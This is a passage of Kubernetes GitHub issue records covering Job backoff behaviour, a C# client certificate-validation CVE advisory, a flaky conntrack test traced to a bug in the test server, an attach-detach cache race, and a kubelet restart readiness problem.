last pod. And `JobController` doesn't delete the pod."}, {"author": "deepaksood619", "body": "/reopen"}, {"author": "k8s-ci-robot", "body": "@deepaksood619: You can't reopen an issue/PR unless you authored it or you are a collaborator.\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/74848#issuecomment-635758869):\n\n>/reopen\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes/test-infra](https://github.com/kubernetes/test-infra/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "csuzhangxc", "body": "> @Joseph-Irving Is there a way, where we can specify the pod that fail 6 times and then stop restarting. So we can get the logs from the last pod. And `JobController` doesn't delete the pod.\r\n\r\n\ud83d\udc4d \r\n\r\nHow to reopen the issue? \ud83e\udd14 "}, {"author": "rafis", "body": "/reopen\r\n"}, {"author": "k8s-ci-robot", "body": "@rafis: You can't reopen an issue/PR unless you authored it or you are a collaborator.\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/74848#issuecomment-814789126):\n\n>/reopen\r\n>\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes/test-infra](https://github.com/kubernetes/test-infra/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "weibeld", "body": "I ran into this issue as well. My expectation was that when a Pod in a Job has `restartPolicy: OnFailure`, a container that fails is restarted indefinitely, independently of any settings in the Job. However, the restarts of a container seem to count against the `backoffLimit` of the Job. So, the actual behaviour is:\r\n\r\n1. A container in the Pod fails and is restarted\r\n1. The Job Controller registers this and increments the backoff counter (which is measured agains `backoffLimit`)\r\n1. The restarted container fails again\r\n1. The Job Controller increments the backoff counter\r\n1. ...\r\n\r\nAt this point, it's still the same Pod running that the Job initially created. However, when the backoff counter reaches `backoffLimit` the Job Controller actively deletes the Pod and marks the Job as Failed with a reason of `BackoffLimitExceeded`.\r\n\r\nThis is different from the behaviour for a Pod with `restartPolicy: Never`. Here the Job Controller only gets active when the Pod as a whole fails, i.e. when _all_ the containers in the Pod fail (and are not restarted because the restart policy is Never, and thus the [phase](https://kubernetes.io/docs/concepts/workloads/pods/pod-lifecycle/#pod-phase) of the Pod is Failed). At this point, the Job Controller increments the backoff counter and creates a new Pod (without deleting the old one). If this Pod fails again, the cycle repeats until the backoff counter reaches `backoffLimit`, at which point the Job is also marked as failed with a reason of `BackoffLimitExceeded`.\r\n\r\nIt's actually described in this way in the [docs](https://kubernetes.io/docs/concepts/workloads/controllers/job/#job-termination-and-cleanup):\r\n\r\n> By default, a Job will run uninterrupted unless a Pod fails (`restartPolicy=Never`) or a Container exits in error (`restartPolicy=OnFailure`), at which point the Job defers to the `.spec.backoffLimit` described above.\r\n\r\nSo, the semantics of `backoffLimit` changes based on the restart policy of the Pods: if `restartPolicy: OnFailure`, then container restarts are counted as backoffs, and if `restartPolicy: Never`, then new Pod creations are counted as backoffs.\r\n\r\nIn the case of `restartPolicy: OnFailure`, the Job Controller must delete the Pod when the Job is officially marked as Failed otherwise the failing container in the Pod might restart forever, or might eventually run successfully, even tough the Job has already been recognised as Failed.\r\n\r\nThis is also mentioned in the [docs](https://kubernetes.io/docs/concepts/workloads/controllers/job/#pod-backoff-failure-policy):\r\n\r\n> If your job has restartPolicy = \"OnFailure\", keep in mind that your container running the Job will be terminated once the job backoff limit has been reached. This can make debugging the Job's executable more difficult.\r\n\r\nI guess it should read \"...your _Pod_ running the Job will be terminated...\"."}, {"author": "Jonathan-Landeed", "body": "`restartPolicy: Never` doesn't prevent pod deletion if parallelism > 1. It's supposed to delete active pods once backoff limit is exceeded, but it's deleting the failed pod as well."}]}
{"repo": "kubernetes/kubernetes", "issue_number": 134063, "issue_url": "https://github.com/kubernetes/kubernetes/issues/134063", "issue_title": "CVE-2025-9708: Kubernetes C# Client: improper certificate validation in custom CA mode may lead to man-in-the-middle attacks", "issue_author": "ritazh", "issue_body": "**CVSS Rating:**  \n[CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N](https://www.first.org/cvss/calculator/3-1#CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N) \u2014 **Medium (6.8)**\n\n\nA vulnerability exists in the Kubernetes C# client where the certificate validation logic accepts properly constructed certificates from any Certificate Authority (CA) without properly verifying the trust chain. This flaw allows a malicious actor to present a forged certificate and potentially intercept or manipulate communication with the Kubernetes API server, leading to possible man-in-the-middle attacks and API impersonation.\n\n### Am I vulnerable?\n\nYou are vulnerable if:\n- You use the Kubernetes C# client to connect to a Kubernetes API server over TLS/HTTPS  with custom CA certificates in your kubeconfig file and your connection occurs over an untrusted network.\n\n#### Affected Versions\n- All versions of the Kubernetes C# client prior to the next release <=17.0.13\n\n### How do I mitigate this vulnerability?\n\nThis issue can be mitigated by:\n- Deploy the patch version of the Kubernetes C# client as soon as possible.\n- Moving the CA certificates into the system trust store instead of specifying them in the kubeconfig file. Note: This approach may introduce new risks, as all processes on the system will begin to trust certificates signed by that CA. If you must use an affected version, you can disable custom CA and add the CA to the machine's trusted root.\n\n\n#### Fixed Versions\n\n- Kubernetes C# client >= v17.0.14\n\n### Detection\n\nTo determine if your applications are affected:\n- Review your usage of the Kubernetes C# client and inspect certificate validation logic.\n- Review your kubeconfig files and determine if you use a custom CA certificate (the certificate-authority field in the clusters section).\n- Review client logs for unexpected or untrusted certificate connections.\n\nIf you find evidence that this vulnerability has been exploited, please contact security@kubernetes.io\n\n#### Acknowledgements\n\nThis vulnerability was reported by @elliott-beach\n\nThe issue was fixed and coordinated by: \n\nBoshi Lian @tg123\nBrendan Burns @brendandburns\nRita Zhang @ritazh\n", "issue_labels": ["kind/bug", "area/security", "committee/security-response", "triage/accepted", "official-cve-feed"], "comments": [{"author": "ritazh", "body": "/area security\n/kind bug\n/committee security-response\n/label official-cve-feed\n/triage accepted"}, {"author": "lmktfy", "body": "If this has been fixed, is it feasible to close the issue?\n\nOpen issues show as open (implying not-yet-fixed) in the [CVE feed](https://kubernetes.io/docs/reference/issues-security/official-cve-feed/)."}]}
{"repo": "kubernetes/kubernetes", "issue_number": 134116, "issue_url": "https://github.com/kubernetes/kubernetes/issues/134116", "issue_title": "[sig-network] Conntrack proxy implementation should not be vulnerable to the invalid conntrack state bug [Privileged] failing due to bug in test", "issue_author": "arkadeepsen", "issue_body": "### Description\n\n`[sig-network] Conntrack proxy implementation should not be vulnerable to the invalid conntrack state bug [Privileged]` has been historically flaking in downstream OpenShift CI jobs. However, the flakes were very random and couldn't be easily reproduced for debugging.\n\n### Details\n\nAs per the test [details](https://github.com/kubernetes/kubernetes/blob/f9a55d78c773fb4fa4a586919d4eff6b4a59c4f9/test/e2e/network/conntrack.go#L544-L668), the test should pass if `nf_conntrack_tcp_be_liberal` is enforced. The test expects that when the server sends an out-of-window TCP packet, it should either be dropped or should be correctly NAT-ed and forwarded to the client. The test fails when the server receives an RST packet from the client which is expected happen when the out-of-window packet is not dropped and also not correctly NAT-ed.\n\nOpenShift uses OVN-Kubernetes CNI and `nf_conntrack_tcp_be_liberal` is always [enforced](https://github.com/torvalds/linux/blob/5aca7966d2a7255ba92fd5e63268dd767b223aa5/net/openvswitch/conntrack.c#L832). Thus, the issue of incorrect NAT should not arise. However, the test still randomly flaked because the server had received an RST packet from the client.\n\nRecently, we took an effort to understand the reason why the test was flaking. For reproducing the issue, the test was run for longer duration of time and packets were captured. The test eventually did fail, however looking at the packet captures it became evident the test failed due to an incorrect logic in the server code, instead of incorrect packet NAT.\n\nPacket capture at the client side:\n```\n9715    2025-09-09 16:58:37.217654    10.129.0.42    172.30.47.170    TCP    74    36955 \u2192 9000 [SYN] Seq=0 Win=62027 Len=0 MSS=8861 SACK_PERM TSval=3989781034 TSecr=0 WS=128\n9716    2025-09-09 16:58:37.217933    172.30.47.170    10.129.0.42    TCP    74    9000 \u2192 36955 [SYN, ACK] Seq=0 Ack=1 Win=61943 Len=0 MSS=8861 SACK_PERM TSval=1962462568 TSecr=3989781034 WS=128\n9717    2025-09-09 16:58:37.217952    10.129.0.42    172.30.47.170    TCP    66    36955 \u2192 9000 [ACK] Seq=1 Ack=1 Win=62080 Len=0 TSval=3989781034 TSecr=1962462568\n9718    2025-09-09 16:58:37.217965    10.129.0.42    172.30.47.170    TCP    66    36955 \u2192 9000 [FIN, ACK] Seq=1 Ack=1 Win=62080 Len=0 TSval=3989781034 TSecr=1962462568\n9719    2025-09-09 16:58:37.218255    172.30.47.170    10.129.0.42    TCP    61    [TCP Spurious Retransmission] 9000 \u2192 36955 [PSH, ACK] Seq=4294867297 Ack=1 Win=62080 Len=7\n9720    2025-09-09 16:58:37.218262    10.129.0.42    172.30.47.170    TCP    78    [TCP Dup ACK 9717#1] 36955 \u2192 9000 [ACK] Seq=2 Ack=1 Win=62080 Len=0 TSval=3989781035 TSecr=1962462568 SLE=4294867297 SRE=4294867304\n9721    2025-09-09 16:58:37.218435    172.30.47.170    10.129.0.42    TCP    66    9000 \u2192 36955 [ACK] Seq=1 Ack=2 Win=61952 Len=0 TSval=1962462569 TSecr=3989781034\n9802    2025-09-09 16:58:47.218027    10.129.0.42    172.30.47.170    TCP    74    38949 \u2192 9000 [SYN] Seq=0 Win=62027 Len=0 MSS=8861 SACK_PERM TSval=3989791034 TSecr=0 WS=128\n9803    2025-09-09 16:58:47.218454    172.30.47.170    10.129.0.42    TCP    66    9000 \u2192 36955 [FIN, ACK] Seq=1 Ack=2 Win=61952 Len=0 TSval=1962472569 TSecr=3989781034\n9804    2025-09-09 16:58:47.218469    10.129.0.42    172.30.47.170    TCP    66    36955 \u2192 9000 [ACK] Seq=2 Ack=2 Win=62080 Len=0 TSval=3989791035 TSecr=1962472569\n9805    2025-09-09 16:58:47.218507    172.30.47.170    10.129.0.42    TCP    74    9000 \u2192 38949 [SYN, ACK] Seq=0 Ack=1 Win=61943 Len=0 MSS=8861 SACK_PERM TSval=1962472569 TSecr=3989791034 WS=128\n9806    2025-09-09 16:58:47.218520    10.129.0.42    172.30.47.170    TCP    66    38949 \u2192 9000 [ACK] Seq=1 Ack=1 Win=62080 Len=0 TSval=3989791035 TSecr=1962472569\n9807    2025-09-09 16:58:47.218538    10.129.0.42    172.30.47.170    TCP    66    38949 \u2192 9000 [FIN, ACK] Seq=1 Ack=1 Win=62080 Len=0 TSval=3989791035 TSecr=1962472569\n9808    2025-09-09 16:58:47.218956    172.30.47.170    10.129.0.42    TCP    61    [TCP Spurious Retransmission] 9000 \u2192 36955 [PSH, ACK] Seq=4294867298 Ack=2768753007 Win=62080 Len=7\n9809    2025-09-09 16:58:47.218972    10.129.0.42    172.30.47.170    TCP    66    [TCP Dup ACK 9804#1] 36955 \u2192 9000 [ACK] Seq=2 Ack=2 Win=62080 Len=0 TSval=3989791035 TSecr=1962472569\n9810    2025-09-09 16:58:47.219013    172.30.47.170    10.129.0.42    TCP    66    9000 \u2192 38949 [ACK] Seq=1 Ack=2 Win=61952 Len=0 TSval=1962472570 TSecr=3989791035\n9816    2025-09-09 16:58:47.219432    172.30.47.170    10.129.0.42    TCP    54    9000 \u2192 36955 [RST] Seq=2 Win=0 Len=0\n9817    2025-09-09 16:58:47.219435    172.30.47.170    10.129.0.42    TCP    61    [TCP Spurious Retransmission] 9000 \u2192 36955 [PSH, ACK] Seq=4294867298 Ack=2567795282 Win=62080 Len=7\n9818    2025-09-09 16:58:47.219445    10.129.0.42    172.30.47.170    TCP    54    36955 \u2192 9000 [RST] Seq=2567795282 Win=0 Len=0\n9888    2025-09-09 16:58:57.219418    172.30.47.170    10.129.0.42    TCP    66    9000 \u2192 38949 [FIN, ACK] Seq=1 Ack=2 Win=61952 Len=0 TSval=1962482570 TSecr=3989791035\n9889    2025-09-09 16:58:57.219444    10.129.0.42    172.30.47.170    TCP    66    38949 \u2192 9000 [ACK] Seq=2 Ack=2 Win=62080 Len=0 TSval=3989801036 TSecr=1962482570\n```\n9719 16:58:37 - Invalid packet injected as part of the test(should be the only one) to the client on port 36955\n9802 16:58:47 - The client initiates a new connection on port 38949\n9803 16:58:47 - The server closes the connection with 36955 after 10s as part of the test and the client ACKs it in 9804\n9808 16:58:47 - Invalid packet injected to the client on port 36955 - BUG, this should not happen, it should be sent to 38949\n9817 16:58:47 - Same thing happens again\n9818 16:58:47 - The client is not happy with that because the connection was already closed, it sends RST to the server (using the clusterIP) because the connection was already closed\n\nLooking at the [server code](https://github.com/kubernetes/kubernetes/blob/f9a55d78c773fb4fa4a586919d4eff6b4a59c4f9/test/images/regression-issue-74839/main.go) the bugs becomes apparent:\n1. SYN from 36955 adds 10.129.0.42 to the `pending` map\n2. ACK from 36955 causes the invalid packet to be injected to that connection and 10.129.0.42 is removed from the `pending` map\n3. SYN from 38949 adds 10.129.0.42 to the `pending` map again\n4. ACK to from 36955(pkt 9804)  causes the invalid packet to be injected again which is not correct\n\n### Expected behavior\n\nThe server should not re-inject the out-of-window packet for an already closed connection.\n\n### Expected fix\n\nThe fix should be to key the `pending` map by IP+ClientPort instead of the only the IP. This will ensure that packets are not injected for any closed connections.\n\nThanks to @kyrtapz for reproducing the issue and debugging it.\n\n/kind bug\n\n/sig network", "issue_labels": ["kind/bug", "sig/network", "triage/accepted"], "comments": [{"author": "aojea", "body": "/triage accepted\n\ngreat analysis. please send the fix so we can release a new image of agnhost without this problem"}, {"author": "arkadeepsen", "body": "/assign"}, {"author": "tssurya", "body": "@arkadeepsen : Thanks for driving this forward!\nPlease add  @kyrtapz as a co-author to the commit.\nThanks both for taking care of this flake"}]}
{"repo": "kubernetes/kubernetes", "issue_number": 111327, "issue_url": "https://github.com/kubernetes/kubernetes/issues/111327", "issue_title": "Pod Informer Update with updated Pod UID can lead to attachdetach controller desired_state_of_world cache inaccuracy", "issue_author": "pwschuurman", "issue_body": "### What happened?\n\nVolume force detached due to incorrect attachdetach controller desired_state_of_world \r\n\r\nThe attach-detach controller reconciles between two caches, actual_state_of_world and desired_state_of_world [Design](https://github.com/kubernetes/kubernetes/issues/20262). The desired state of the world is updated by a [pod informer](https://github.com/kubernetes/kubernetes/blob/master/pkg/controller/volume/attachdetach/attach_detach_controller.go#L196).\r\n\r\nAs discovered in #83810, a pod delete and create event with the same pod name can be delivered as an update event by the pod informer. The attachdetach controller treats pod add/update events the same, but only updates the desired_state_of_world if a [pod does not exist](https://github.com/kubernetes/kubernetes/blob/master/pkg/controller/volume/attachdetach/cache/desired_state_of_world.go#L257). This means that if the event is an add/delete event (delivered as an update event with a updated pod UID), the desired_state_of_world will not be updated with the latest UID. If this happens, the state of the desired_state_of_world is inaccurate, as the pod UID is stale.\r\n\r\nPeriodically, the desired_state_of_world_populator reconciles all pods in its cache. If it detects a pod UID mismatch with the current pod UID in the informer, the pod is [removed from desired_state_of_world](https://github.com/kubernetes/kubernetes/blob/master/pkg/controller/volume/attachdetach/populator/desired_state_of_world_populator.go#L154). Once removed, the pod can be force detached by the reconciler, if it has not existed in the desired_state_of_world for [the timeout period, 6 minutes](https://github.com/kubernetes/kubernetes/blob/86571236e32f5e5b94c4336407878beb7d41a87a/pkg/controller/volume/attachdetach/reconciler/reconciler.go#L265). Note that prior to #110721, this was done for all nodes, not just unhealthy nodes.\r\n\r\nThe attachdetach controller has a safeguard to reconcile this type of inaccuracy. In desired_state_of_world_populator, there are two loops\r\n1. The [findAndRemoveDeletedPods()](https://github.com/kubernetes/kubernetes/blob/release-1.22/pkg/controller/volume/attachdetach/populator/desired_state_of_world_populator.go#L115) loop. This runs at a period of every 1 minute\r\n2. The [findAndAddActivePods()](https://github.com/kubernetes/kubernetes/blob/release-1.22/pkg/controller/volume/attachdetach/populator/desired_state_of_world_populator.go#L175) loop. This runs at a period of every 3 minutes.\r\n\r\nIn this scenario, if findAndRemoveDeletedPods() removes a pod, and findAndAddActivePods() runs directly after, desired_state_of_world only stays in an inaccurate state for a brief period of time. However, if the desired_state_of_world_populator loop has some latency in processing (eg: large number of pods, CPU throttling), it's possible for more than 6 minutes to pass between when the pod is removed from desired_state_of_world and when the pod is added back in the findAndAddActivePods() loop.\n\n### What did you expect to happen?\n\nExpect a volume to not be force detached, if the pod that consumes the volume is quickly deleted/re-created.\n\n### How can we reproduce it (as minimally and precisely as possible)?\n\nConsistently reproducing is tricky, as it requires a short enough time delta to allow an delete/add to be merged into an update event and constraining the kube-controller-manager. However the general flow is:\r\n1. Create a pod that uses a volume\r\n2. Quickly delete/add the pod. This may be merged into an update event by the Pod Informer\r\n3. If the DSW gets corrupted in findAndRemoveDeletedPods(), and findAndAddActivePods() doesn't run before the 6 minute window, attachdetach reconciler loop should force detach the volume. The kube-controller-manager may need to be artificially constrained (limit CPU request) for this to be reproduced.\n\n### Anything else we need to know?\n\nThis is very similar to the issue fixed in kube-scheduler here: https://github.com/kubernetes/kubernetes/pull/91126\n\n### Kubernetes version\n\n1.22\n\n### Cloud provider\n\n<details>\r\nGKE\r\n</details>\r\n\n\n### OS version\n\n<details>\r\n\r\n```console\r\n# On Linux:\r\n$ cat /etc/os-release\r\n# paste output here\r\n$ uname -a\r\n# paste output here\r\n\r\n# On Windows:\r\nC:\\> wmic os get Caption, Version, BuildNumber, OSArchitecture\r\n# paste output here\r\n```\r\n\r\n</details>\r\n\n\n### Install tools\n\n<details>\r\n\r\n</details>\r\n\n\n### Container runtime (CRI) and version (if applicable)\n\n<details>\r\n\r\n</details>\r\n\n\n### Related plugins (CNI, CSI, ...) and versions (if applicable)\n\n<details>\r\n\r\n</details>\r\n", "issue_labels": ["kind/bug", "sig/storage", "lifecycle/rotten", "triage/needs-information"], "comments": [{"author": "neolit123", "body": "/sig node api-machinery\r\n"}, {"author": "endocrimes", "body": "/sig storage"}, {"author": "leilajal", "body": "/cc @wojtek-t @MikeSpreitzer \r\n/triage accepted"}, {"author": "k8s-triage-robot", "body": "The Kubernetes project currently lacks enough contributors to adequately respond to all issues and PRs.\n\nThis bot triages issues and PRs according to the following rules:\n- After 90d of inactivity, `lifecycle/stale` is applied\n- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n\nYou can:\n- Mark this issue or PR as fresh with `/remove-lifecycle stale`\n- Mark this issue or PR as rotten with `/lifecycle rotten`\n- Close this issue or PR with `/close`\n- Offer to help out with [Issue Triage][1]\n\nPlease send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n\n/lifecycle stale\n\n[1]: https://www.kubernetes.dev/docs/guide/issue-triage/"}, {"author": "vaibhav2107", "body": "/remove-lifecycle stale"}, {"author": "k8s-triage-robot", "body": "The Kubernetes project currently lacks enough contributors to adequately respond to all issues and PRs.\n\nThis bot triages issues and PRs according to the following rules:\n- After 90d of inactivity, `lifecycle/stale` is applied\n- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n\nYou can:\n- Mark this issue or PR as fresh with `/remove-lifecycle stale`\n- Mark this issue or PR as rotten with `/lifecycle rotten`\n- Close this issue or PR with `/close`\n- Offer to help out with [Issue Triage][1]\n\nPlease send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n\n/lifecycle stale\n\n[1]: https://www.kubernetes.dev/docs/guide/issue-triage/"}, {"author": "wojtek-t", "body": "/remove-lifecycle stale"}, {"author": "k8s-triage-robot", "body": "This issue has not been updated in over 1 year, and should be re-triaged.\n\nYou can:\n- Confirm that this issue is still relevant with `/triage accepted` (org members only)\n- Close this issue with `/close`\n\nFor more details on the triage process, see https://www.kubernetes.dev/docs/guide/issue-triage/\n\n/remove-triage accepted"}, {"author": "wojtek-t", "body": "/triage accepted"}, {"author": "k8s-triage-robot", "body": "This issue has not been updated in over 1 year, and should be re-triaged.\n\nYou can:\n- Confirm that this issue is still relevant with `/triage accepted` (org members only)\n- Close this issue with `/close`\n\nFor more details on the triage process, see https://www.kubernetes.dev/docs/guide/issue-triage/\n\n/remove-triage accepted"}, {"author": "BenTheElder", "body": "@kannon92 https://github.com/kubernetes/kubernetes/issues/111327 is sig node still tracking this? should we re-accepted, or freeze? (https://github.com/kubernetes/test-infra/issues/32957)"}, {"author": "kannon92", "body": "It reads more like a sig-storage bug.\n\nI see it is in their backlog so I'd triage it as you did."}, {"author": "seans3", "body": "/remove-sig api-machinery\nPlease re-add us if you need our attention. Thanks :)"}, {"author": "haircommander", "body": "@pwschuurman is this still an issue? there have been lots of changes to pod lifecycle between now and 1.22, and I wonder if this was fixed in that time. if not, it may be a sig storage issue\n\n/triage needs-information"}, {"author": "haircommander", "body": "/remove-sig node"}, {"author": "k8s-triage-robot", "body": "The Kubernetes project currently lacks enough contributors to adequately respond to all issues.\n\nThis bot triages un-triaged issues according to the following rules:\n- After 90d of inactivity, `lifecycle/stale` is applied\n- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n\nYou can:\n- Mark this issue as fresh with `/remove-lifecycle stale`\n- Close this issue with `/close`\n- Offer to help out with [Issue Triage][1]\n\nPlease send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n\n/lifecycle stale\n\n[1]: https://www.kubernetes.dev/docs/guide/issue-triage/"}, {"author": "k8s-triage-robot", "body": "The Kubernetes project currently lacks enough active contributors to adequately respond to all issues.\n\nThis bot triages un-triaged issues according to the following rules:\n- After 90d of inactivity, `lifecycle/stale` is applied\n- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n\nYou can:\n- Mark this issue as fresh with `/remove-lifecycle rotten`\n- Close this issue with `/close`\n- Offer to help out with [Issue Triage][1]\n\nPlease send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n\n/lifecycle rotten\n\n[1]: https://www.kubernetes.dev/docs/guide/issue-triage/"}, {"author": "k8s-triage-robot", "body": "The Kubernetes project currently lacks enough active contributors to adequately respond to all issues and PRs.\n\nThis bot triages issues according to the following rules:\n- After 90d of inactivity, `lifecycle/stale` is applied\n- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n\nYou can:\n- Reopen this issue with `/reopen`\n- Mark this issue as fresh with `/remove-lifecycle rotten`\n- Offer to help out with [Issue Triage][1]\n\nPlease send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n\n/close not-planned\n\n[1]: https://www.kubernetes.dev/docs/guide/issue-triage/"}, {"author": "k8s-ci-robot", "body": "@k8s-triage-robot: Closing this issue, marking it as \"Not Planned\".\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/111327#issuecomment-3315160744):\n\n>The Kubernetes project currently lacks enough active contributors to adequately respond to all issues and PRs.\n>\n>This bot triages issues according to the following rules:\n>- After 90d of inactivity, `lifecycle/stale` is applied\n>- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n>- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n>\n>You can:\n>- Reopen this issue with `/reopen`\n>- Mark this issue as fresh with `/remove-lifecycle rotten`\n>- Offer to help out with [Issue Triage][1]\n>\n>Please send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n>\n>/close not-planned\n>\n>[1]: https://www.kubernetes.dev/docs/guide/issue-triage/\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}]}
{"repo": "kubernetes/kubernetes", "issue_number": 131303, "issue_url": "https://github.com/kubernetes/kubernetes/issues/131303", "issue_title": "After kubelet is restarted, the pod status is temporarily reset to 0/1.", "issue_author": "Black-max12138", "issue_body": "### What happened?\n\nAfter the kubelet process is restarted, the pod status is reset to 0/1. After the ready probe is ready, the pod status is restored to 1/1.As a result, the pod cannot receive traffic for a short time.\n\n### What did you expect to happen?\n\nWhen kubelet is restarted, the pod status should not change.\n\n### How can we reproduce it (as minimally and precisely as possible)?\n\nRestart the kubelet process.\n\n### Anything else we need to know?\n\n_No response_\n\n### Kubernetes version\n\n<details>\n\n```console\n$ kubectl version\n# paste output here\n```\n1.31\n</details>\n\n\n### Cloud provider\n\n<details>\n\n</details>\n\n\n### OS version\n\n<details>\n\n```console\n# On Linux:\n$ cat /etc/os-release\n# paste output here\n$ uname -a\n# paste output here\n\n# On Windows:\nC:\\> wmic os get Caption, Version, BuildNumber, OSArchitecture\n# paste output here\n```\n\n</details>\n\n\n### Install tools\n\n<details>\n\n</details>\n\n\n### Container runtime (CRI) and version (if applicable)\n\n<details>\n\n</details>\n\n\n### Related plugins (CNI, CSI, ...) and versions (if applicable)\n\n<details>\n\n</details>\n", "issue_labels": ["kind/bug", "needs-sig", "lifecycle/rotten", "needs-triage"], "comments": [{"author": "k8s-ci-robot", "body": "There are no sig labels on this issue. Please add an appropriate label by using one of the following commands:\n- `/sig <group-name>`\n- `/wg <group-name>`\n- `/committee <group-name>`\n\nPlease see the [group list](https://git.k8s.io/community/sig-list.md) for a listing of the SIGs, working groups, and committees available.\n\n\n<details>\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "k8s-ci-robot", "body": "This issue is currently awaiting triage.\n\nIf a SIG or subproject determines this is a relevant issue, they will accept it by applying the `triage/accepted` label and provide further guidance.\n\nThe `triage/accepted` label can be added by org members by writing `/triage accepted` in a comment.\n\n\n<details>\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "molinsoma", "body": "I also ran into this problem, when I restarted kubelet, my pod couldn't receive requests."}, {"author": "jzlyy", "body": "After the kubelet process is restarted, the pod status is reset to 0/1. After the ready probe is ready, the pod status is restored to 1/1.As a result, the pod cannot receive traffic for a short time.\n\nBased on the information you provided, I realized that when the kubelet restarts, it will resynchronize pod statuses with the API Server. Additionally, the kubelet restart will also cause the readiness probes in pods to restart, potentially resulting in the Pod 0/1 status."}, {"author": "k8s-triage-robot", "body": "The Kubernetes project currently lacks enough contributors to adequately respond to all issues.\n\nThis bot triages un-triaged issues according to the following rules:\n- After 90d of inactivity, `lifecycle/stale` is applied\n- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n\nYou can:\n- Mark this issue as fresh with `/remove-lifecycle stale`\n- Close this issue with `/close`\n- Offer to help out with [Issue Triage][1]\n\nPlease send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n\n/lifecycle stale\n\n[1]: https://www.kubernetes.dev/docs/guide/issue-triage/"}, {"author": "k8s-triage-robot", "body": "The Kubernetes project currently lacks enough active contributors to adequately respond to all issues.\n\nThis bot triages un-triaged issues according to the following rules:\n- After 90d of inactivity, `lifecycle/stale` is applied\n- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n\nYou can:\n- Mark this issue as fresh with `/remove-lifecycle rotten`\n- Close this issue with `/close`\n- Offer to help out with [Issue Triage][1]\n\nPlease send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n\n/lifecycle rotten\n\n[1]: https://www.kubernetes.dev/docs/guide/issue-triage/"}, {"author": "k8s-triage-robot", "body": "The Kubernetes project currently lacks enough active contributors to adequately respond to all issues and PRs.\n\nThis bot triages issues according to the following rules:\n- After 90d of inactivity, `lifecycle/stale` is applied\n- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n\nYou can:\n- Reopen this issue with `/reopen`\n- Mark this issue as fresh with `/remove-lifecycle rotten`\n- Offer to help out with [Issue Triage][1]\n\nPlease send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n\n/close not-planned\n\n[1]: https://www.kubernetes.dev/docs/guide/issue-triage/"}, {"author": "k8s-ci-robot", "body": "@k8s-triage-robot: Closing this issue, marking it as \"Not Planned\".\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/131303#issuecomment-3311148487):\n\n>The Kubernetes project currently lacks enough active contributors to adequately respond to all issues and PRs.\n>\n>This bot triages issues according to the following rules:\n>- After 90d of inactivity, `lifecycle/stale` is applied\n>- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n>- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n>\n>You can:\n>- Reopen this issue with `/reopen`\n>- Mark this issue as fresh with `/remove-lifecycle rotten`\n>- Offer to help out with [Issue Triage][1]\n>\n>Please send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n>\n>/close not-planned\n>\n>[1]: https://www.kubernetes.dev/docs/guide/issue-triage/\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or 